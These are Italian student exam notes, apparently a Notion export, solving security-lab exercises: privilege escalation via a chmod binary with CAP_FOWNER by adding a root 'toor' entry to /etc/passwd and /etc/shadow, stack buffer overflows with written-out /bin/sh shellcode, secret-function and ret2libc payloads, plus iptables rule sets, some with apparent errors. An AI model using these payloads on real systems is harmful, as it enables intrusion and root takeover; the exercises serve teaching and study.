class="">sudo aide -c /etc/aide/aide.conf -C</p><p id="14e9ac4b-2ce2-470b-846f-8248bd41a7af" class="">Tale comando confronta il mio sistema con le istantanea /var/lib/aide/aide.db, restituendo all’utente le differenze:</p><figure id="be42ef0c-0bb5-4351-a471-0f0f4c839149" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%205.png"><img style="width:432px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%205.png"/></a></figure><p id="bfed9cc7-f498-4aa4-ab86-6817dc774ce7" class="">Si analizzano meglio le modifiche apportate dal binario:</p><ul id="070d465f-3417-44f2-9eae-308d4cb2cd31" class="bulleted-list"><li style="list-style-type:disc">Per quanto riguarda il file /etc/passwd si può notare che l’unica modifica apportata riguarda il timestamp. Il fatto che questa modifica non possa essere sfruttate per eseguire privilege esclation è sottolineato anche eseguendo il comando diff. </li></ul><ul id="ac697067-928e-42cf-91c1-23b959dd03ff" class="bulleted-list"><li style="list-style-type:disc">Per quanto riguarda il file /etc/shadow si può osservare che è stato rimosso il permesso di lettura per quanto riguarda il gruppo proprietario. Questa modifica non si può utilizzare per eseguire privilege escalation</li></ul><ul id="a076f78d-836a-488b-9de1-f2c665679ecb" class="bulleted-list"><li style="list-style-type:disc">Per quanto riguarda le ultime due modifiche, si esegue il seguente comando per evidenziare meglio la modifica delle capability:<figure id="0f0a9a22-5bc6-4d1e-b8fb-7f0977fe902f" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%206.png"><img style="width:416px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%206.png"/></a></figure><p id="58a67382-cc4b-420c-838d-4d2d34a0701a" class="">Grazie all’ouput riportato è possibile vedere che è stato assegnato al comando chmod la capability CAP_FOWNER=eip che permette di ignorare la coerenza di ownership tra processo e file. Al comando tail non è stata assegnata nessuna capability. </p></li></ul><p id="b95ebff6-f464-48ed-8942-7c055fe0670c" class="">Di conseguenza l’unico comando che si può utilizzare per eseguire privilege escalation è il comando chmod, assegnando permessi di scrittura e lettura al gruppo others per quanto riguarda i file /etc/passwd e /etc/shadow. In questo modo i due file si possono modificare per inserire rispettivamente nel primo e nel secondo file: </p><p id="b33464fe-186f-4ba1-8a13-828ad6630db5" class="">toor:x:0:0:toor:/root:/usr/bin/zsh</p><p id="f60e8c29-1b0f-4488-8259-46449baf21ef" class="">toor:$1$jJW38ySC$rATQakFmOlxIgA0Nrw3Ix/:19590:0:99999:7:::</p><p id="9eae416d-4b5e-4280-aa9c-faf0343b13d1" class="">L’hash inserito come password all’interno del file /etc/shadow è stato calcolato attraverso il comando:</p><p id="207b2418-6bb9-4af5-b17b-f10b71e91f59" class="">openssl passwd gotRoot</p><p id="5a1308de-51ef-49bf-92d7-7aeb7200ae1e" class="">Di seguito si riportano i comandi eseguiti e l’esito dell’inserimento dell’utente root:</p><figure id="ce30b7d2-618f-4971-a795-8bce05cdf889" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%207.png"><img style="width:336px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%207.png"/></a></figure></details></li></ul><p id="0f34ed86-0143-46aa-8711-e632a15396e2" class="">openssl passwd ciao —&gt; crea la password da inserire nel file /etc/shadow</p><p id="875aed6b-9525-426f-affd-b83bc5e10e0b" class="">oppure si può creare un nuov utente con una determinata password e lo si copia incolla nello spazio dell’utente che si vuole creare</p></details></li></ul><ul id="cd3c7dbf-cbcf-4dbd-9658-b1194d41c007" class="toggle"><li><details open=""><summary>Web</summary><ul id="425dd3fa-018e-4e32-bc06-9762acae3d8a" class="toggle"><li><details open=""><summary>web_ce.py → 9 settembre 2022</summary><p id="ce57d16f-1154-43d1-b8a9-df375acda0c1" class="">
</p></details></li></ul></details></li></ul><ul id="ba9cb0e8-d92b-46a7-b0ad-fd8de4ea23e1" class="toggle"><li><details open=""><summary>Binary</summary><ul id="17ba0141-cc8d-4c42-90fa-ee2eaf24fd4f" class="toggle"><li><details open=""><summary>11 giugno 2021 - shellcode</summary><p id="17f11ef5-4ff4-41ba-a27f-cf1111ebef6e" class="">Dopo aver assegnato il permesso di esecuzione all’eseguibile fornito, lancio l’eseguibile attraverso l’utilizzo di gdb. Fornendo vari input attraverso il comando run $(perl -e ‘print “A”xN’), scopro che è possibile causare segmentation fault grazie all’input $(perl -e ‘print “A”x618’), mentre sono in grado di eseguire un attacco d buffer overflow, con la modifica dell’indirizzo di ritorno e la conseguente ridirezione del flusso di esecuzione, con ingresso $(perl -e ‘print “A”x622, “BBBB”’): </p><figure id="0c5de709-9ddd-44ed-8813-b0900a98183e" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%208.png"><img style="width:528px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%208.png"/></a></figure><p id="22d009fb-0a43-4f96-9875-01a05253aaa8" class="">L’immagine sottolinea che l’indirizzo di ritorno dalla chiamata a funzione viene totalmente sovrascritto dalla conversione esadecimale dei caratteri “B” inseriti all’interno del payload. </p><p id="b3e6538a-a667-4e38-85e2-f9fd909a973d" class="">Adesso è possibile attuare l’attacco con l’utilizzo dello shellcode. Il payload finale presenterà una struttura del tipo:</p><p id="1000c3fa-707b-487e-9cf3-c8fa33a53bb5" class="">$(perl -e ‘print “\x90”xN, “SHELLCODE”, “INDIRIZZO_RITORNO”’)</p><p id="4fcc07e3-314c-4acb-a51f-5b67cc54e966" class="">1) Come prima parte della sringa vengono inseriti un numero N di istruzioni NOP, istruzioni che eseguono un ciclo di clock a vuoto. Quest’ultime vengono inserite per aumentare la probabilità di esecuzione delo shellcode inserito, in quanto è sufficiente che l’indirizzo di ritorno inserito cada in uno dei comandi NOP. Il numero N di istruzioni da inserire viene calcolato come la differenza dei caratteri necessari per inziare a sovrascrivere l’indirizzo di ritorno (622 in questo caso) e la lunghezza dello shellcode fornito. Per calcolare quest’ultima si ricorre alla funzione len(b’SHELLCODE’) del comando python3, verificando che lo shellcode presenta una lunghezza di 46 caratteri. Per questo motivo il numero N di istruzioni NOP sarà 622-46=576.</p><p id="e96cc256-7029-474b-8884-d23d25331ed2" class="">2) Per individuare l’indirizzo di ritorno, dopo aver eseguito il run con input la concatenazione tra l’insieme di istruzioni NOP e lo shellcode, si può osservare il contenuto dello stack attravero il comando x/400xw $esp , osservando la presenza di blocchi di NOP:</p><figure id="1d710bac-fe33-41a3-b7c3-4b0a14ab27e2" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%209.png"><img style="width:480px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%209.png"/></a></figure><p id="cbf13a8f-60e9-416f-85bc-8cc98ddc559b" class="">Di conseguenza, scegliendo come indirizzo di ritorno 0xffffd1e0 si avrà un elevata probabilità di esecuzione dello shellcode. L’indirizzo verrà inserito all’interno del payload in little endian. Il payload finale è il seguente:</p><p id="d5009c50-0133-49cd-9314-b6b4d9e5139b" class="">$(perl -e &#x27;print &quot;\x90&quot;x576, &quot;\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&quot;, &quot;\xe0\xd1\xff\xff&quot;&#x27;)</p><p id="a83714ea-8f14-4e43-a74e-7fcb9e53851c" class="">Il risultato che si ottiene è del tipo:</p><figure id="2c65bb54-f901-4a8a-af9a-e55c386d0fa4" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2010.png"><img style="width:576px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2010.png"/></a></figure><p id="87434c8b-dcc7-42f1-a05e-656a680a9bd5" class="">
</p></details></li></ul><ul id="39a84084-9d23-4325-9375-f30454b23c18" class="toggle"><li><details open=""><summary>25 giugno 2021- secret function</summary><p id="fe8c027c-59bd-45b2-a698-300e2a91b8f8" class="">Dopo aver assegnato il permesso di esecuzione all’eseguibile fornito, lancio l’eseguibile attraverso l’utilizzo di gdb. Fornendo vari input attraverso il comando run $(perl -e ‘print “A”xN’), scopro che è possibile causare segmentation fault grazie all’input $(perl -e ‘print “A”x16’), mentre sono in grado di eseguire un attacco di buffer overflow, con la modifica dell’indirizzo di ritorno e la conseguente ridirezione del flusso di esecuzione, con ingresso $(perl -e ‘print “A”x16, “BBBB”’): </p><figure id="42e81f0c-2ea5-4063-ab72-9dea70816f67" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2011.png"><img style="width:652px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2011.png"/></a></figure><p id="13abfc1f-0815-4486-9eba-9cb0c9bd388f" class="">L’immagine sottolinea che l’indirizzo di ritorno dalla chiamata a funzione viene totalmente sovrascritto dalla conversione esadecimale dei caratteri “B” inseriti all’interno del payload. </p><p id="34fc1f77-bd19-4cc6-b21e-bdc75953b9d9" class="">Successivamente, attraverso il comando info function, verifico la presenza di una o più funzioni segrete:</p><figure id="330d2f68-665d-4fbe-b013-cfae8ad7b84e" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2012.png"><img style="width:430px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2012.png"/></a></figure><p id="b833dd0c-d7f0-44f0-b534-9c41c9d8b0f9" class="">Le funzioni sopra riportate posso essere utilizzate per ridirigere il flusso di esecuzione delle dell’eseguibile lanciato. Il payload per provare l’attacco di buffer overflow è:</p><p id="ca983de6-af3b-4052-aa22-dc7486f4627e" class="">$(perl -e ‘print “A”x16, “INDIRIZZO_RITORNO”’)</p><p id="576effde-ae88-476a-8dd9-67a9e25fbe50" class="">Dove gli indirizzi di ritorno sono gli indirizzi delle funzioni sopra indicate. Tali indirizzi vengono inseriti in little endian. La prova dell’attacco si può vedere nell’immagine seguente:</p><figure id="1a91c1b0-111c-438b-9baa-3dbfb0c770c5" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2013.png"><img style="width:576px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2013.png"/></a></figure><p id="13312f27-c6b5-4cb8-8c00-609f4608694b" class="">Dall’immagine si può vedere che il payload finale per trovare la flag è:</p><p id="0fb449c0-7cfb-4cc2-94d4-60950676ba75" class="">$(perl -e &#x27;print &quot;A&quot;x16, &quot;\x42\x64\x55\x56&quot;&#x27;)</p><p id="b679e0e4-83ae-4c29-a2c7-5d261d17304e" class="">Tale payload viene provato anche fuori dall’ambiente gdb producendo il seguente output:</p><figure id="52970f45-e7d7-4e65-b042-d9beb698bb8c" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2014.png"><img style="width:650px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2014.png"/></a></figure></details></li></ul><ul id="a73e089c-0d77-4ec4-9648-1bd06e1d1920" class="toggle"><li><details open=""><summary>10 settembre 2021- shellcode</summary><p id="d78f5aae-59ad-40b3-81ec-b6a1e5d54875" class="">Dopo aver assegnato il permesso di esecuzione all’eseguibile fornito, lancio l’eseguibile attraverso l’utilizzo di gdb. Fornendo vari input attraverso il comando run $(perl -e ‘print “A”xN’), scopro che è possibile causare segmentation fault grazie all’input $(perl -e ‘print “A”x1518’), mentre sono in grado di eseguire un attacco d buffer overflow, con la modifica dell’indirizzo di ritorno e la conseguente ridirezione del flusso di esecuzione, con ingresso $(perl -e ‘print “A”x1522, “BBBB”’): </p><figure id="fd8f4051-7360-4857-9d3c-25345a54d4dc" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2015.png"><img style="width:483px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2015.png"/></a></figure><p id="70737234-9594-4f53-824f-6e05689d0b90" class="">L’immagine sottolinea che l’indirizzo di ritorno dalla chiamata a funzione viene totalmente sovrascritto dalla conversione esadecimale dei caratteri “B” inseriti all’interno del payload. </p><p id="717d4d7c-6482-4940-a5d9-1ba619bd99a3" class="">Adesso è possibile attuare l’attacco con l’utilizzo dello shellcode. Il payload finale presenterà una struttura del tipo:</p><p id="c66f2462-41ea-4fd7-b65b-d6d15e23c536" class="">$(perl -e ‘print “\x90”xN, “SHELLCODE”, “INDIRIZZO_RITORNO”’)</p><p id="a3ecdcc9-407d-48f2-a048-da60bdd85e40" class="">1) Come prima parte della sringa vengono inseriti un numero N di istruzioni NOP, istruzioni che eseguono un ciclo di clock a vuoto. Quest’ultime vengono inserite per aumentare la probabilità di esecuzione delo shellcode inserito, in quanto è sufficiente che l’indirizzo di ritorno inserito cada in uno dei comandi NOP. Il numero N di istruzioni da inserire viene calcolato come la differenza dei caratteri necessari per inziare a sovrascrivere l’indirizzo di ritorno (1522 in questo caso) e la lunghezza dello shellcode fornito. Per calcolare quest’ultima si ricorre alla funzione len(b’SHELLCODE’) del comando python3, verificando che lo shellcode presenta una lunghezza di 46 caratteri. Per questo motivo il numero N di istruzioni NOP sarà 1522-46=1476</p><p id="5b858bb5-391d-4e3f-b7f8-a6eb1ac8f762" class="">2) Per individuare l’indirizzo di ritorno, dopo aver eseguito il run con input la concatenazione tra l’insieme di istruzioni NOP e lo shellcode, si può osservare il contenuto dello stack attravero il comando x/400xw $esp , osservando la presenza di blocchi di NOP:</p><figure id="0acd846a-b7b2-4749-bf74-7c1b3e285a4a" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2016.png"><img style="width:483px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2016.png"/></a></figure><p id="b36cce24-48aa-4d18-8b34-06c07ea97ad3" class="">Di conseguenza, scegliendo come indirizzo di ritorno 0xffffcdf0, a metà dello stack, si avrà un elevata probabilità di esecuzione dello shellcode. L’indirizzo verrà inserito all’interno del payload in little endian. Il payload finale è il seguente:</p><p id="21be1aff-90f1-498d-8509-b0189ab9e16b" class="">$(perl -e &#x27;print &quot;\x90&quot;x1476, &quot;\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&quot;, &quot;\xf0\xcd\xff\xff&quot;&#x27;)</p><p id="e3aa2e5f-40a4-4174-aa95-12a413b0c0bf" class="">Il risultato che si ottiene è del tipo:</p><figure id="5c004fb8-0925-4035-a977-23c7f58d42ad" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2017.png"><img style="width:483px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2017.png"/></a></figure></details></li></ul><ul id="2c25be48-47dc-4754-a95f-5405cdbcdb94" class="toggle"><li><details open=""><summary>10 febbraio 2023 -secret function</summary><p id="81693b73-7e0c-4690-b143-d7a0bfd8f14f" class="">Dopo aver assegnato il permesso di esecuzione all’eseguibile fornito, lancio l’eseguibile attraverso l’utilizzo di gdb. Fornendo vari input attraverso il comando run $(perl -e ‘print “A”xN’), scopro che è possibile causare segmentation fault grazie all’input $(perl -e ‘print “A”x16’), mentre sono in grado di eseguire un attacco di buffer overflow, con la modifica dell’indirizzo di ritorno e la conseguente ridirezione del flusso di esecuzione, con ingresso $(perl -e ‘print “A”x16, “BBBB”’): </p><figure id="34cf4028-c362-4103-a68b-0084fd69c45a" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2018.png"><img style="width:430px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2018.png"/></a></figure><p id="b6817ad2-2a1a-4ea4-9516-33bcb8425ea1" class="">L’immagine sottolinea che l’indirizzo di ritorno dalla chiamata a funzione viene totalmente sovrascritto dalla conversione esadecimale dei caratteri “B” inseriti all’interno del payload. </p><p id="bf3a3ca4-cab3-4d5a-873f-b5cabb4eeb38" class="">Successivamente, attraverso il comando info function, verifico la presenza di una o più funzioni segrete:</p><figure id="b470d6c8-3d6d-4301-b966-8cd481205f48" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2019.png"><img style="width:430px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2019.png"/></a></figure><p id="d754899f-599a-4402-a15a-efeb180ba784" class="">Le funzioni sopra riportate posso essere utilizzate per ridirigere il flusso di esecuzione delle dell’eseguibile lanciato. Il payload per provare l’attacco di buffer overflow è:</p><p id="2f549afb-9b94-4a2a-88d4-80bc46dc5b18" class="">$(perl -e ‘print “A”x16, “INDIRIZZO_RITORNO”’)</p><p id="acffbebd-eabc-41d8-95cc-a4cd3ffb475f" class="">Dove gli indirizzi di ritorno sono gli indirizzi delle funzioni sopra indicate. Tali indirizzi vengono inseriti in little endian. La prova dell’attacco si può vedere nell’immagine seguente:</p><figure id="f20f2991-4754-4d62-8356-0da594b09eae" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2020.png"><img style="width:430px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2020.png"/></a></figure><p id="8a4c18d7-8397-4a94-acde-8cec1f990700" class="">Dall’immagine si può vedere che il payload finale per trovare la flag è:</p><p id="90fb1ead-9b56-4f68-a7fa-b40717e5debe" class="">run $(perl -e &#x27;print &quot;A&quot;x16, &quot;\x3d\x96\x04\x08&quot;&#x27;)</p><p id="32ceae88-e6d3-40db-8101-df4b655e4e7e" class="">ovvero inserendo l’indirizzo della secret function D. La flag che si trova è del tipo: </p><p id="fd4b5c58-effa-4507-bb3e-de518d13ca8f" class="">SEC{c2ltcGxlIGJ1ZmZlciBvdmVyZmxvdyB3aXRoIHNlY3JldCBmdW5jdGlvbg}</p><p id="cfb56bf9-7fc7-46ba-82e6-ee59413fa614" class="">Per recuperare il valore effettivo della flag si eseguono i seguenti comandi:</p><figure id="f531dd2b-8c64-433b-bb98-4f50f0fa405d" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2021.png"><img style="width:430px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2021.png"/></a></figure><p id="13bff8a9-4cab-43c8-9984-ac853fb4cf78" class="">Il payload può essere eseguito anche al di fuori dell’ambiente gdb come denota la seguente immagine:</p><figure id="ec3fed88-8825-43e0-88a2-7a5602e0b648" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2022.png"><img style="width:430px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2022.png"/></a></figure></details></li></ul><ul id="6ff97db5-5a1d-4240-99c4-23ab2cbcd0af" class="toggle"><li><details open=""><summary>return2sys</summary><p id="10f7b080-557e-4136-87e6-543a740e571a" class="">Dopo aver assegnato il permesso di esecuzione all’eseguibile fornito, lancio l’eseguibile attraverso l’utilizzo di gdb. Fornendo vari input attraverso il comando run $(perl -e ‘print “A”xN’), scopro che è possibile causare segmentation fault grazie all’input $(perl -e ‘print “A”x1508’), mentre sono in grado di eseguire un attacco di buffer overflow, con la modifica dell’indirizzo di ritorno e la conseguente ridirezione del flusso di esecuzione, con ingresso $(perl -e ‘print “A”x1512, “BBBB”’): </p><figure id="2c0bfda0-f1e4-4b1d-9d9d-48d02aa7d8c4" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2023.png"><img style="width:480px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2023.png"/></a></figure><p id="7cdf251c-c6ec-465b-ab43-dc3c70c1be3a" class="">L’immagine sottolinea che l’indirizzo di ritorno dalla chiamata a funzione viene totalmente sovrascritto dalla conversione esadecimale dei caratteri “B” inseriti all’interno del payload. </p><p id="0dc13dcf-50e7-4dc2-9c71-4ed40c4b5d2e" class="">Dopo aver verificato l’assenza di una funzione segreta tramite il comando info function e non potendo eseguire un attacco di shellcode, provo ad eseguire un attacco ret2syscall. Questo attacco è utile per sfuggire a NX stacks, strumento di protezione fornito dall’hardware (non nei sistemi a 32 bit) che deve essere supportato dal sistema operativo e permette di inserire dei flag associati a delle pagine di memoria, indicando se sono eseguibili o meno. Questo attacco permette di evitare NX stacks in quanto si va a ricercare del codice all’interno del text segment, spazio di indirizzamento del processo dedicato al codice eseguibile. Il payload di quest’attacco presenta una forma del tipo:</p><p id="f8ab1fc0-b3b4-4558-b244-1c20fe9bb2ad" class="">$(perl -e ‘print “\x90”x1512, “indirizzo_system”, “indirizzo_exit”, “indirizzo_variabile d’ambiente”’)</p><ul id="56345705-cf07-48bb-ab28-8c1df1078590" class="bulleted-list"><li style="list-style-type:disc">Come prima parte della sringa vengono inseriti un numero N di istruzioni NOP, istruzioni che eseguono un ciclo di clock a vuoto.</li></ul><ul id="ae6d3cfc-583d-47a3-94a5-974b494765e3" class="bulleted-list"><li style="list-style-type:disc">Le due parti successive dell’input rappresentano l’indirizzo della system call che si vuole andare ad eseguire, ovvero la systemcall system() e l’indirizzo della systemcall exit(), per consentire una terminazione pulita del processo. I due indirizzi si ricavano nel seguente modo: <figure id="c378277b-4dbf-416d-b777-94fbcf939750" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2024.png"><img style="width:521px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2024.png"/></a></figure></li></ul><ul id="cc4c53dd-00b7-4407-b3e8-5ce16d42cb75" class="bulleted-list"><li style="list-style-type:disc">L’ultimo parametro che viene passato è il valore della variabile d’ambiente SHELL che deve essere passata alla system call system(). L’indirizzo si può osservare tramite il comando x/500s $esp, ottenendo il seguente output:<figure id="a0131cce-a5a6-45c8-9ae4-69587b9f1404" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2025.png"><img style="width:464px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2025.png"/></a></figure><p id="8cb12955-2669-4562-9100-cec8b75c6619" class="">come si può vedere dall’immagine, la variabile d’ambiente presenta una forma del tipo SHELL=valore, ma per eseguire l’attacco dobbiamo prelevare solamente il valore di tale variabile. Per farlo è necessario sommare all’indirizzo indicato, grazie all’utilizzo della funzione hex offerta da python3, il valore 6, ovvero il numero di caratteri presenti prima del valore della variabile d’ambiente. Si ottiene così il valore 0xffffd4d7</p></li></ul><p id="a3206003-b91b-4c5a-91e1-5015cd7003df" class="">Tutti gli indirizzi trovati vengono inseriti in little endian. Il payload finale presenta una forma del tipo:</p><p id="c5dc8755-fa5a-4748-90cc-9e253778c4cf" class="">run $(perl -e &#x27;print &quot;\x90&quot;x1512, &quot;\x10\xdd\xc4\xf7&quot;, &quot;\x30\xd2\xc3\xf7&quot;, &quot;\xd7\xd4\xff\xff&quot;&#x27;)</p><figure id="9665bc48-a23b-4bc7-a4db-d7c659731d57" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2026.png"><img style="width:521px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2026.png"/></a></figure></details></li></ul></details></li></ul><ul id="0070faa2-ecb6-44da-bc74-fac4eb17a361" class="toggle"><li><details open=""><summary>Firewall</summary><ul id="0d0ac23a-4083-4134-aeaa-7da74263db40" class="toggle"><li><details open=""><summary>11 giugno 2021</summary><p id="a06f05c1-e6c6-4f06-91f5-ea5fa3068327" class="">Regole iptables da inserire sono:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="94911b7b-5ba1-4836-8c98-f365417a55b9" class="code"><code class="language-JavaScript">#Comandi per liberare tutte le catene 
iptables -F INPUT
iptables -F OUTPUT
iptables -F FORWARD

#Regole per consentire qualsiasi traffico su interfaccia di loopback
iptables -A INPUT -i lo -j ACCEPT 
iptables -A INPUT -o lo -j ACCEPT

#Regole per consentire il traffico delle connessioni HTTP entranti
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT

#Regole per consentire connessioni ssh uscenti verso 192.168.56.0/24
iptables -A INPUT -s 192.168.56.0/24 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -d 192.168.56.0/24 -p tcp --dport 22 -j ACCEPT

#Regole per bloccare l&#x27;inoltro del traffico da host only ad altre destinazioni
iptables -A FORWARD -s 192.168.56.0/24 -j DROP
iptables -A FORWARD -d 192.168.56.0/24 -j DROP

#Regole per consentire la risoluzione dei nomi DNS
iptables -A INPUT -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT 

#Regole per bloccare tutto il traffico restante
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD ACCEPT</code></pre></details></li></ul><ul id="1b0f66a0-5797-426a-bb6e-9431b13fe566" class="toggle"><li><details open=""><summary>13 settembre 2023</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="37b1a688-29a6-4582-b8b5-1f8f0cbd342c" class="code"><code class="language-JavaScript">#Regole client
	#Regole per servizi DNS e NTP su internet
	iptables -A OUTPUT -o eth1 -d 130.136.5.0/8 -p udp --dport 53 -j ACCEPT
	iptables -A OUTPUT -o eth1 -d 130.136.5.0/8 -p udp --dport 123 -j ACCEPT
	iptables -A INPUT -i eth1 -s 130.136.5.0/8 -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
	iptables -A INPUT -i eth1 -s 130.136.5.0/8 -p udp --sport 123 -m state --state ESTABLISHED -j ACCEPT 
	
	#Regole per default deny
		iptables -P INPUT DROP
		iptables -P OUTPUT DROP
		
#Regole router
	#Regole per forward servizi DNS e NTP
	iptables -A FORWARD -i eth1 -o eth3 -s 192.168.0.0/16 -d 130.136.5.0/8 -p udp --dport 53 -j ACCEPT
	iptables -A FORWARD -i eth1 -o eth3 -s 192.168.0.0/16 -d 130.136.5.0/8 -p udp --dport 123 -j ACCEPT
	iptables -A FORWARD -o eth1 -i eth3 -d 192.168.0.0/16 -s 130.136.5.0/8 -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
	iptables -A FORWARD -o eth1 -i eth3 -d 192.168.0.0/16 -s 130.136.5.0/8 -p udp --sport 123 -m state --state ESTABLISHED -j ACCEPT
	iptables -t nat -A POSTROUTING -i eth1 -o eth2 -s 192.168.0.0/16 -d 130.136.5.0/8 -p udp -j SNAT --to-source 130.136.5.15

	#Regole per forward servizio SMTP
	iptables -t nat -A PREROUTING -i eth3 -o eth2 -d 130.136.5.15 -p tcp --dport 25 -j DNAT --to-destination 172.16.0.1
	iptables -A FORWARD -i eth2 -o eth3 -s 172.16.0.0/16 -d 130.136.5.0/8 -p tcp --sport 25 -m state --state ESTABLISHED  -j ACCEPT
	iptables -A FORWARD -o eth2 -i eth3 -d 172.16.0.0/16 -s 130.136.5.0/8 -p tcp --dport 25 -j ACCEPT
	
	#Regole per servizio LDAP
	iptables -A INPUT -i eth2 -s 172.16.0.1 -d 172.16.15.254 -p tcp --dport 389 -j ACCEPT
	iptables -A OUTPUT -o eth2 -d 172.16.0.1 -s 172.16.15.254 -p tcp --sport 389 -m state --state ESTABLISHED -j ACCEPT
	
